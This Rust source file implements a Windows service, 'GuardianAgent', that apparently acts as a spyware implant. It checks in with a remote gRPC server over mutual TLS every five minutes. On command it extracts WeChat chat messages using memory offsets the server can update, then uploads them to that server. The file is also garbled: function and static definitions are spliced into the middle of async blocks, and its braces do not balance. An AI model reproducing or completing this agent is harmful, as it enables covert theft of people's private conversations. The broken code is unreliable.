use tonic::transport::{ClientTlsConfig, Certificate, Identity};
use std::fs;
use std::panic;
use chrono;
use std::sync::{Arc, Mutex};
use once_cell::sync::Lazy;
use tokio_retry::Retry;
use tokio_retry::strategy::{ExponentialBackoff, jitter};
use tonic::transport::Channel;
use guardian::agent_service_client::AgentServiceClient;
use guardian::HeartbeatRequest;
use guardian::data_service_client::DataServiceClient;
use guardian::{UploadMessagesRequest, ChatMessage};
use core::signature_config::SignatureConfig;
use prost_types::Timestamp;
use std::time::{SystemTime, UNIX_EPOCH};
use std::ffi::OsString;
use std::sync::mpsc;
use std::thread;
use std::time::Duration;
use windows_service::service::{ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus, ServiceType};
use windows_service::service_control_handler::{self, ServiceControlHandlerResult};
use windows_service::service_dispatcher;
use windows_service::define_windows_service;
use windows_service::service::ServiceStatusHandle;
use windows_service::Result as WinServiceResult;

mod core;

mod guardian {
    tonic::include_proto!("guardian");
}

// ...existing code...

define_windows_service!(ffi_service_main, my_service_main);

fn main() -> WinServiceResult<()> {
    // 在程序最开始设置 panic hook
    panic::set_hook(Box::new(|panic_info| {
        let msg = if let Some(s) = panic_info.payload().downcast_ref::<&str>() {
            *s
        } else if let Some(s) = panic_info.payload().downcast_ref::<String>() {
            s
        } else {
            "Box<Any>"
        };
        let location = panic_info.location().map_or("Unknown location".to_string(), |loc| {
            format!("{}:{}:{}", loc.file(), loc.line(), loc.column())
        });
        let error_message = format!("FATAL PANIC: '{}' at {}", msg, location);
        eprintln!("{}", error_message); // 打印到 stderr
        // 尝试写入文件 (这是一个简单的实现)
        use std::fs::OpenOptions;
        use std::io::Write;
        if let Ok(mut file) = OpenOptions::new().create(true).append(true).open("guardian_agent_panic.log") {
            let _ = writeln!(file, "[{}] {}", chrono::Local::now(), error_message);
        }
    }));
    // 启动服务调度器
    service_dispatcher::start("GuardianAgent", ffi_service_main)?;
    Ok(())
}

fn my_service_main(_args: Vec<OsString>) {
    if let Err(e) = run_service() {
        // 记录错误
        eprintln!("Service error: {e}");
    }
}

fn run_service() -> WinServiceResult<()> {
    // 注册服务控制 handler
    let (shutdown_tx, shutdown_rx) = mpsc::channel();
    let status_handle = service_control_handler::register("GuardianAgent", move |control_event| {
        match control_event {
            ServiceControl::Stop | ServiceControl::Shutdown => {
                shutdown_tx.send(()).ok();
                ServiceControlHandlerResult::NoError
            }
            _ => ServiceControlHandlerResult::NotImplemented,
        }
    })?;

    // 设置服务为 Running
    set_service_status(&status_handle, ServiceState::Running)?;

    // 启动 tokio runtime
    let rt = match tokio::runtime::Runtime::new() {
        Ok(rt) => rt,
        Err(e) => {
            eprintln!("Failed to create tokio runtime: {e}");
            return Ok(());
        }
    };
    rt.block_on(async move {
        use tokio::time::{sleep, Duration};
        // 加载 mTLS 证书
        let ca_cert = fs::read("ca.crt").expect("failed to read ca.crt");
        let client_cert = fs::read("client.crt").expect("failed to read client.crt");
        let client_key = fs::read("client.key").expect("failed to read client.key");
        let identity = Identity::from_pem(client_cert, client_key);
        let ca = Certificate::from_pem(ca_cert);
        let tls = ClientTlsConfig::new()
            .ca_certificate(ca)
            .identity(identity)
            .domain_name("your.server.domain"); // 替换为你的服务器证书CN

        let channel = Channel::from_static("https://your.server.domain:50051")
            .tls_config(tls).expect("tls config error")
            .connect().await.expect("tls connect error");

        loop {
            let strategy = ExponentialBackoff::from_millis(10)
                .max_delay(Duration::from_secs(60))
                .map(jitter);
            let result = Retry::spawn(strategy, || async {
                // 连接到 gRPC 服务器 (mTLS)
                let mut client = AgentServiceClient::new(channel.clone());
                // 构建 HeartbeatRequest
                let request = tonic::Request::new(HeartbeatRequest {
                    agent_id: 1,
                    hostname: whoami::hostname(),
                });
                // 调用 heartbeat 方法并解析响应
                let resp = client.heartbeat(request).await?.into_inner();

                // 判断 task_type
                if resp.task_type == guardian::TaskType::DumpWechatData as i32 {
                    slog::info!("CPU-intensive task received. Offloading to a blocking thread.");
                    // 获取当前特征码配置（动态）
                    let config = SIGNATURE_CONFIG.lock().unwrap().clone();
                    let task_handle = tokio::task::spawn_blocking(move || {
                        crate::core::wechat::get_wechat_data(&config)
                    });
// 获取当前特征码配置（占位，后续将由心跳响应动态更新）
fn get_current_signature_config() -> SignatureConfig {
    // 示例：默认空配置，后续需替换为动态下发内容
    SignatureConfig {
        wechat_version: "unknown".to_string(),
        magic_offsets: vec![],
    }
}
                    match task_handle.await {
                        Ok(Ok(messages)) => {
                            slog::info!("Task completed successfully in blocking thread.");
                            let now = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs() as i64;
                            let chat_messages: Vec<ChatMessage> = messages.into_iter().map(|msg| ChatMessage {
                                content: msg.content,
                                timestamp: Some(Timestamp { seconds: msg.timestamp, nanos: 0 }),
                            }).collect();
                            // 上传消息
                            if !chat_messages.is_empty() {
                                let mut data_client = DataServiceClient::new(channel.clone());
                                let _ = data_client.upload_messages(tonic::Request::new(UploadMessagesRequest {
                                    agent_id: 1,
                                    messages: chat_messages,
                                })).await;
                            }
                        },
                        Ok(Err(e)) => {
                            slog::error!("Task failed within blocking thread"; "error" => e.to_string());
                        },
                        Err(join_error) => {
                            slog::error!("A panic occurred in the blocking task"; "error" => join_error.to_string());
                        }
                    }
                }
                Ok::<(), anyhow::Error>(())
            }).await;
            if let Err(e) = result {
                eprintln!("[FATAL] gRPC retry failed: {e}");
            }
            // 非阻塞地等待5分钟
            sleep(Duration::from_secs(300)).await;
        }
    });
                // 检查是否有下发 signature_config 字段（假设为 JSON 字符串）
                if let Some(sig_json) = resp.signature_config_json.as_ref() {
                    if let Ok(new_config) = serde_json::from_str::<SignatureConfig>(sig_json) {
                        let mut guard = SIGNATURE_CONFIG.lock().unwrap();
                        *guard = new_config;
                        slog::info!("SignatureConfig updated from backend");
                    } else {
                        slog::warn!("Failed to parse signature_config_json from backend");
                    }
                }

                break;
// 全局持有 SignatureConfig，支持动态热更新
static SIGNATURE_CONFIG: Lazy<Arc<Mutex<SignatureConfig>>> = Lazy::new(|| {
    Arc::new(Mutex::new(SignatureConfig {
        wechat_version: "unknown".to_string(),
        magic_offsets: vec![],
    }))
});
}

fn set_service_status(handle: &ServiceStatusHandle, state: ServiceState) -> WinServiceResult<()> {
    handle.set_service_status(ServiceStatus {
        service_type: ServiceType::OWN_PROCESS,
        current_state: state,
        controls_accepted: ServiceControlAccept::STOP | ServiceControlAccept::SHUTDOWN,
        exit_code: ServiceExitCode::Win32(0),
        checkpoint: 0,
        wait_hint: Duration::default(),
        process_id: None,
    })
}
